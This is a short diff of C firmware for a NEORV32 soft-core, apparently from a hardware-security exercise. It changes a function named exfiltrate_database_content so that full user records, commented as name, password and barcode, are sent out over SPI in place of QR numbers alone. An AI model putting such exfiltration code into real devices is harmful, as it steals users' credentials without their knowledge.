@@ -78,21 +78,34 @@ void exfiltrate_database_content() {
         // neorv32_uart_gets(NEORV32_UART0, response);
         neorv32_uart_gets(NEORV32_UART0_BASE, response);
 
-        int found_count = sscanf(response, "qr:%lld", &qr_num);
-        if (!found_count) {
-            // check if received string starts with "end"
-            if (strncmp(response, "end", 3) == 0) {
-                end_found = true;
-            }
-        } else {
-            // send the received QR code number via SPI
-            // character by character
-            char qr_str[32];
-            sprintf(qr_str, "%lld\n", qr_num);
-            for (size_t i = 0; i < strlen(qr_str); i++) {
-                char ret_val = neorv32_spi_transfer(qr_str[i]);
-            }
+        if (strncmp(response, "end", 3) == 0) {
+            end_found = true;
+            continue;
         }
+
+        // message format:
+        // Name Surname | password | barcode 
+        size_t msg_length = strlen(response);
+        for (size_t i = 0; i < msg_length; i++) {
+            char ret_val = neorv32_spi_transfer(response[i]);
+        }
+        neorv32_spi_transfer('\n');
+
+        // int found_count = sscanf(response, "qr:%lld", &qr_num);
+        // if (!found_count) {
+        //     // check if received string starts with "end"
+        //     if (strncmp(response, "end", 3) == 0) {
+        //         end_found = true;
+        //     }
+        // } else {
+        //     // send the received QR code number via SPI
+        //     // character by character
+        //     char qr_str[32];
+        //     sprintf(qr_str, "%lld\n", qr_num);
+        //     for (size_t i = 0; i < strlen(qr_str); i++) {
+        //         char ret_val = neorv32_spi_transfer(qr_str[i]);
+        //     }
+        // }
     }
 }
                                                     
